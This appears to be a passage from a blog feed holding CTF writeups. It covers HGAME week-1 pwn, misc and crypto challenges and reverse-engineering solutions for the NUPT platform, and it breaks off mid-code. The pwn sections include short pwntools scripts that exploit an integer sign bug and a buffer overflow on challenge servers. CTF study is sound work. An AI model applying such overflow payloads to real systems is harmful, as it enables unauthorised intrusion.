&quot;admin&quot;</code> 并猜到随机数。但是随机数种子拿不到，在生成之后、判断之前也无法覆盖掉这个数：</p><p><img src="/images/writeup-of-hgame-week1/pwn2-1.png" alt="pwn2-1"></p><p>　　所以考虑另外一条路：直接在前边将 <code>is_admin</code> 覆盖成为真。该题有三处输入，<code>scanf(&quot;%u&quot; 与 &quot;%d&quot;)</code> 都无法覆盖到其他地方的数据，只剩 <code>read_n()</code> 有可能。进去之后仔细阅读代码：</p><p><img src="/images/writeup-of-hgame-week1/pwn2-2.png" alt="pwn2-2"></p><p>　　联系之前“loading”的 hint，发现没有考虑 <code>i</code> 为负数的情况，而且正好可以通过 <code>i &lt;= 63</code> 的限制。手动 nc 输入 -1 验证一下，发现可以成功覆盖到 <code>is_admin</code>，所以可以构造 payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'111.230.149.72'</span>, <span class="number">10001</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'length: '</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">conn.send(<span class="string">'-1\n'</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'username?'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">conn.send(<span class="string">'@'</span> * <span class="number">68</span> + <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment"># 让 is_admin 非零即可</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>　　即可成功获取 Flag：hgame{Be_c4r3fu1_wHile_u5ing_1nt_And_unsigned_1nt}</p><h3 id="zazahui-50"><a href="#zazahui-50" class="headerlink" title="zazahui [50]"></a>zazahui [50]</h3><p><img src="/images/writeup-of-hgame-week1/pwn3.png" alt="pwn3"></p><p>　　<code>main()</code> 函数就几行代码，先设置无缓冲，然后依次调用两个函数。先跟进第一个函数：</p><p><img src="/images/writeup-of-hgame-week1/pwn3-1.png" alt="pwn3-1"></p><p>　　此函数把 <code>ad</code> 和 <code>Flag</code> 的内容读入到 .bss 段特定地址，那看来待会要修改某个指针的值以指向放在内存里的 Flag。再看一下第二个函数：</p><p><img src="/images/writeup-of-hgame-week1/pwn3-2.png" alt="pwn3-2"></p><p>　　念 100 次是没用的←_←读下去，发现只有一处 <code>read_n()</code> 可供输入。该函数内容跟上题一致，就是已经限定了最大长度为 188。本以为这唯一的入口没法溢出了，不过在查看栈空间时发现，188 已经超过了 <code>buffer</code> 实际所占有的长度 176：</p><p><img src="/images/writeup-of-hgame-week1/pwn3-3.png" alt="pwn3-3"></p><p>　　那么只要将 <code>ptr_ad</code> 的值给覆盖成 .bss 里储存 <code>Flag</code> 的地址即可。构造 payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'111.230.149.72'</span>, <span class="number">10003</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'&gt; '</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">conn.send(<span class="string">'@'</span> * <span class="number">176</span> + p32(<span class="number">0x0804a060</span>) + p32(<span class="number">100</span>) + <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment"># p32(100) 是为了让 times != 0，否则无法获得 Flag。</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>　　Flag：hgame{y0u_c4n_4lso_s3nd_unprint4ble_ch4r}</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="{ Misc }"></a>{ Misc }</h2><h3 id="白菜1-50"><a href="#白菜1-50" class="headerlink" title="白菜1 [50]"></a>白菜1 [50]</h3><p>　　先丢到 binwalk 跑一番：</p><p><img src="/images/writeup-of-hgame-week1/misc1.png" alt="misc1"></p><p>　　刚开始以为这个 zlib 有猫腻，谷歌后发现是 PNG 的正常组成部分，初步排除图种。所以我就把图片拖进 Stegsolve 继续分(瞎)析(试)。谷歌了常见隐写术之后，在 Row, LSB First, R0 G0 B0 参数下看到了 ZIP 文件头，Save Bin 并打开生成的压缩包，成功拿到 Flag：hgame{4246a2158c280cdd1e8c18c57e96095f}</p><h3 id="白菜2-50"><a href="#白菜2-50" class="headerlink" title="白菜2 [50]"></a>白菜2 [50]</h3><p>　　binwalk 显示后边还有个 zip，用 <code>binwalk -eM misc2.jpg</code> 分离出文件后，得到 Flag：hgame{af2ab981a021e3def22646407cee7bdc}</p><h3 id="pcap1-50"><a href="#pcap1-50" class="headerlink" title="pcap1 [50]"></a>pcap1 [50]</h3><p>　　将该文件用 Wireshark 打开，搜索字符串“flag”，发现一个 GET 请求：</p><p><img src="/images/writeup-of-hgame-week1/misc3.png" alt="misc3"></p><p>　　在下边的 Response 里将 gzip 解开即可得到 Flag：hgame{bfebcf95972871907c89893aa3096ec6}</p><p><img src="/images/writeup-of-hgame-week1/misc3-1.png" alt="misc3-1"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="{ Crypto }"></a>{ Crypto }</h2><h3 id="easy-Caesar-50"><a href="#easy-Caesar-50" class="headerlink" title="easy Caesar [50]"></a>easy Caesar [50]</h3><p>　　题目很清晰，找到一个解密凯撒的网站(<a href="http://tools.matchzones.net/caesar_cipher)，在向下移位" target="_blank" rel="noopener">http://tools.matchzones.net/caesar_cipher)，在向下移位</a> 12 字符的时候看到了 <code>hgame{The_qu8ck_br7wn_1x_jUmps_ovEr_a_La9y_dOg}</code>，直接提交发现出错，便根据语义将数字也移一下位，得到最终 Flag：<code>hgame{The_qu1ck_br0wn_4x_jUmps_ovEr_a_La2y_dOg}</code></p><h3 id="Polybius-50"><a href="#Polybius-50" class="headerlink" title="Polybius [50]"></a>Polybius [50]</h3><p>　　读完给的链接，把密文整理了一下，发现对应 12345 的可能就是 ADFGX，谷歌之，从 <a href="https://zh.wikipedia.org/wiki/ADFGVX%E5%AF%86%E7%A2%BC" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/ADFGVX%E5%AF%86%E7%A2%BC</a> 拿到对应的字母布局。一个个对照过去，提交后发现不对。……中间省略一大堆不明所以的操作……最后联想到，在那个按照字母顺序的的版本里，I 跟 J 是放一起的（这个“联想”我等了四天才等到= =）。于是我转换了一下 I 跟 J，以及大小写，终于得到最终 Flag：hgame{fritz_nebel_invented_it}（谷歌也刚好有 Fritz Nebel 这个人）</p><h3 id="Hill-50"><a href="#Hill-50" class="headerlink" title="Hill [50]"></a>Hill [50]</h3><p>　　既然题目把加密方式跟密钥都讲了出来，我就直接找工具了←_←找到这个 <a href="http://www.practicalcryptography.com/ciphers/hill-cipher/#javascript-example-of-the-hill-cipher" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/hill-cipher/#javascript-example-of-the-hill-cipher</a> 将密文跟密钥拖进去得到 Flag：hgame{overthehillx}</p><h3 id="confusion-100"><a href="#confusion-100" class="headerlink" title="confusion [100]"></a>confusion [100]</h3><p>　　一看就觉得是摩尔斯电码，解密得到 <code>MRLTK6KXNVZXQWBSNA2FSU2GGBSW45BSLAZFU6SVJBNDAZSRHU6Q====</code>，发现以四个 = 结尾，怀疑是 base32。再次解密得到 <code>dW5yWmsxX2h4YSF0ent2X2ZzUHZ0fQ==</code>，符合 base64 的特点，又可得到 <code>unrZk1_hxa!tz{v_fsPvt}</code>。初步怀疑是栅栏密码，但是密文有 { } h a 这几个字符，却没有 g m e，怀疑是 rot13，得到 <code>haeMx1_ukn!gm{i_sfCig}</code>。接着用栅栏解密得到最终 Flag：hgame{Mix_1s_fuCking!}</p><h3 id="baby-step-66"><a href="#baby-step-66" class="headerlink" title="baby step [66]"></a>baby step [66]</h3><p>　　得到 hint 之后，以 “baby step ctf” 为关键词在谷歌搜到了这个网页：<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete_log/discrete_log_intro.html#id8" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete_log/discrete_log_intro.html#id8</a> ，得知此类问题可用 “baby step - giant step” 算法解决。找了几篇介绍如何实现的文章之后，自己写了一段 Py 脚本，直接把字典当 Hash 表，发现极其慢。在群里大佬提示下，去 <a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a> 跑了一下现学现卖的三行 Sage，跑出第一个数：0x2c7de99911，其中“E9”明显不是可见字符。又经过群里大佬提示，发现了第二个符合要求的数：0x7831333337，所以得到 Flag：x1337</p><p>　　Sage 代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = Mod(0x1111111111, 0x976693344d)</span><br><span class="line">b = Mod(0x7ac21f64ed, 0x976693344d)</span><br><span class="line">bsgs(a, b, (0x2c7de99911 + 1, 0x7f7f7f7f7f))</span><br></pre></td></tr></table></figure></p><p>　　Python 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ans = hex(<span class="number">0x7831333337</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">print(<span class="string">''</span>.join([</span><br><span class="line">    chr(int(ans[i:i+<span class="number">2</span>], base=<span class="number">16</span>)) \</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ans), <span class="number">2</span>)</span><br><span class="line">]))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;{ Web }&quot;&gt;&lt;/a&gt;{ Web }&lt;/h2&gt;&lt;h3 id=&quot;Are-you-from-Europe-100&quot;&gt;&lt;a href=&quot;#Are-you-from-Europ
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://oyiadin.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://oyiadin.github.io/tags/writeup/"/>
    
      <category term="HGAME" scheme="http://oyiadin.github.io/tags/HGAME/"/>
    
      <category term="Web" scheme="http://oyiadin.github.io/tags/Web/"/>
    
      <category term="Reverse" scheme="http://oyiadin.github.io/tags/Reverse/"/>
    
      <category term="Pwn" scheme="http://oyiadin.github.io/tags/Pwn/"/>
    
      <category term="Misc" scheme="http://oyiadin.github.io/tags/Misc/"/>
    
      <category term="Crypto" scheme="http://oyiadin.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>南邮网络攻防训练平台逆向入门题目 Writeup</title>
    <link href="http://oyiadin.github.io/2018/writeup-of-ctf-nuptzj-re/"/>
    <id>http://oyiadin.github.io/2018/writeup-of-ctf-nuptzj-re/</id>
    <published>2018-02-03T16:00:00.000Z</published>
    <updated>2018-02-14T12:13:58.568Z</updated>
    
    <content type="html"><![CDATA[<p>共三道题，前边几道题比较简单，就不写 writeup 了。</p><h2 id="WxyVM"><a href="#WxyVM" class="headerlink" title="WxyVM"></a>WxyVM</h2><p>二话不说拖进 IDA，找到 <code>main</code> 后 F5，顺便给作用明显的变量命个名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [sp+Bh] [bp-5h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[WxyVM 0.0.1]"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;scanf_buffer_bytes);</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  sub_4005B6();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;scanf_buffer_bytes) != <span class="number">24</span> )</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;scanf_buffer_bytes + i) != goal_dword[i] )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"correct"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑很清晰，先读字符串到 <code>scanf_buffer_bytes</code>，然后调用 <code>sub_4005B6()</code>，推测是进行加密，子函数跑完后，让加密后的数据跟 <code>goal_dword</code> 进行比对。读懂代码后直接跟进去子函数，同样对，先明显意图的变量进行命名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ST04_4@3</span></span><br><span class="line">  __int64 result; <span class="comment">// rax@3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+0h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+8h] [bp-8h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14999</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = raw_data[(<span class="keyword">signed</span> __int64)i];</span><br><span class="line">    v3 = raw_data[(<span class="keyword">signed</span> __int64)(i + <span class="number">2</span>)];</span><br><span class="line">    result = v0;</span><br><span class="line">    <span class="keyword">switch</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        result = raw_data[(<span class="keyword">signed</span> __int64)(i + <span class="number">1</span>)];</span><br><span class="line">        *(&amp;scanf_buffer_bytes + result) += v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        result = raw_data[(<span class="keyword">signed</span> __int64)(i + <span class="number">1</span>)];</span><br><span class="line">        *(&amp;scanf_buffer_bytes + result) -= v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        result = raw_data[(<span class="keyword">signed</span> __int64)(i + <span class="number">1</span>)];</span><br><span class="line">        *(&amp;scanf_buffer_bytes + result) ^= v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        result = raw_data[(<span class="keyword">signed</span> __int64)(i + <span class="number">1</span>)];</span><br><span class="line">        *(&amp;scanf_buffer_bytes + result) *= v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        result = raw_data[(<span class="keyword">signed</span> __int64)(i + <span class="number">1</span>)];</span><br><span class="line">        *(&amp;scanf_buffer_bytes + result) ^= *(&amp;scanf_buffer_bytes + raw_data[(<span class="keyword">signed</span> __int64)(i + <span class="number">2</span>)]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读一下代码，大意是从 <code>raw_data</code> 依次读取数据，3 Bytes 为一组。Byte 1 用来 switch，Byte 2 用来指定相对于 <code>buffer</code> 的偏移量，Byte 3 用以参与计算。</p><p>所以代码到这就很明显了，从 <code>goal_dword</code> 逆操作还原出 <code>scanf_buffer_bytes</code> 即可。不过代码里有两个坑：</p><ol><li>从 <code>goal_dword</code> 取数据时需要每 4 位只保留最低位。</li><li>会溢出</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#IDAPython</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">raw_data = <span class="number">0x00000000006010C0</span></span><br><span class="line">answer   = <span class="number">0x0000000000601060</span></span><br><span class="line">buffer   = <span class="number">0x0000000000604B80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆操作</span></span><br><span class="line">op = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">lambda</span> x, y: (x-y)%sys.maxint+<span class="number">1</span> <span class="keyword">if</span> x-y&lt;<span class="number">0</span> <span class="keyword">else</span> x-y,</span><br><span class="line">    <span class="comment"># 这里为了模拟溢出，比较粗暴</span></span><br><span class="line">    <span class="number">2</span>: <span class="keyword">lambda</span> x, y: (x+y)%maxint,</span><br><span class="line">    <span class="number">3</span>: <span class="keyword">lambda</span> x, y: x^y,</span><br><span class="line">    <span class="number">4</span>: <span class="keyword">lambda</span> x, y: x/y,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    PatchByte(buffer+i, Byte(answer+<span class="number">4</span>*i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14997</span>, <span class="number">-1</span>, <span class="number">-3</span>):</span><br><span class="line">    v0 = Byte(raw_data + i)</span><br><span class="line">    v1 = Byte(raw_data + i + <span class="number">1</span>)</span><br><span class="line">    v2 = Byte(raw_data + i + <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> v0 &gt; <span class="number">0</span> <span class="keyword">and</span> v0 &lt; <span class="number">5</span>:</span><br><span class="line">        PatchByte(buffer+v1, op[v0](Byte(buffer+v1), v2))</span><br><span class="line">    <span class="keyword">elif</span> v0 == <span class="number">5</span>:</span><br><span class="line">        PatchByte(buffer+v1, Byte(buffer+v1)^Byte(buffer+v2))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># find flag at buffer</span></span><br></pre></td></tr></table></figure><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>照常拖进 IDA 顺势 F5，读代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 offset; <span class="comment">// rbx@4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> chr; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">bool</span> v5; <span class="comment">// bp@5</span></span><br><span class="line">  <span class="keyword">bool</span> v6; <span class="comment">// al@8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *msg; <span class="comment">// rdi@19</span></span><br><span class="line">  __int64 y; <span class="comment">// [sp+0h] [bp-28h]@1</span></span><br><span class="line">  __int32 x;  <span class="comment">// 读汇编后觉得 &amp;y+1 视为 &amp;x 更好</span></span><br><span class="line"></span><br><span class="line">  x = <span class="number">0L</span>;</span><br><span class="line">  y = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;buffer, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;buffer) != <span class="number">24</span> || <span class="built_in">strncmp</span>(&amp;buffer, <span class="string">"nctf&#123;"</span>, <span class="number">5u</span>LL) || *(&amp;byte_6010BF + <span class="number">24</span>) != <span class="number">125</span> )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">// assert len(buffer) == 24 &amp;&amp; buffer.startswith("nctf&#123;") &amp;&amp; buffer.endswith("&#125;")</span></span><br><span class="line">wrong_and_exit:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong flag!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  offset = <span class="number">5L</span>L;  <span class="comment">// 从 &#123; 后面第一个字符开始，后边 ++offset 遍历 buffer</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;buffer) - <span class="number">1</span> &gt; <span class="number">5</span> )  <span class="comment">// 恒为真</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      chr = *(&amp;buffer + offset);</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( chr &gt; <span class="string">'N'</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        chr = (<span class="keyword">unsigned</span> __int8)chr;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)chr == <span class="string">'O'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = func_O((_DWORD *)&amp;x);  <span class="comment">// v6 = x-- &gt; 0;</span></span><br><span class="line">          <span class="keyword">goto</span> assign_v6_to_v5_and_goto_label_15;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( chr == <span class="string">'o'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = func_o((<span class="keyword">int</span> *)&amp;x);  <span class="comment">// v6 = x++ &lt; 8;</span></span><br><span class="line">          <span class="keyword">goto</span> assign_v6_to_v5_and_goto_label_15;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        chr = (<span class="keyword">unsigned</span> __int8)chr;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)chr == <span class="string">'.'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = func_dot(&amp;y);  <span class="comment">// v6 = y-- &gt; 0;</span></span><br><span class="line">          <span class="keyword">goto</span> assign_v6_to_v5_and_goto_label_15;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( chr == <span class="string">'0'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = func_0((<span class="keyword">int</span> *)&amp;y);  <span class="comment">// v6 = y++ &lt; 8;</span></span><br><span class="line">assign_v6_to_v5_and_goto_label_15:</span><br><span class="line">          v5 = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 分析到下边发现是走迷宫，O左 o右 .上 0下</span></span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)check(asc_601060, x, y) )  <span class="comment">// SHIDWORD(y) == x, 检查是否撞到墙壁</span></span><br><span class="line">        <span class="comment">// asc_601060: 8x8 array</span></span><br><span class="line">        <span class="comment">//   ******</span></span><br><span class="line">        <span class="comment">// *   *  *</span></span><br><span class="line">        <span class="comment">// *** * **</span></span><br><span class="line">        <span class="comment">// **  * **</span></span><br><span class="line">        <span class="comment">// *  *#  *</span></span><br><span class="line">        <span class="comment">// ** *** *</span></span><br><span class="line">        <span class="comment">// **     *</span></span><br><span class="line">        <span class="comment">// ********</span></span><br><span class="line">        <span class="comment">// return 1 if asc[x][y] == (' ' or '#') else 0</span></span><br><span class="line">        <span class="keyword">goto</span> wrong_and_exit;  <span class="comment">// assert return == 1;</span></span><br><span class="line">      <span class="keyword">if</span> ( ++offset &gt;= <span class="built_in">strlen</span>(&amp;buffer) - <span class="number">1</span> )  <span class="comment">// 自增，如果下一个已经是 &#125;，则：</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 )  <span class="comment">// 防止走出迷宫的范围</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">wrong_and_exit_2:</span><br><span class="line">        msg = <span class="string">"Wrong flag!"</span>;</span><br><span class="line">        <span class="keyword">goto</span> show_msg_and_exit;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( 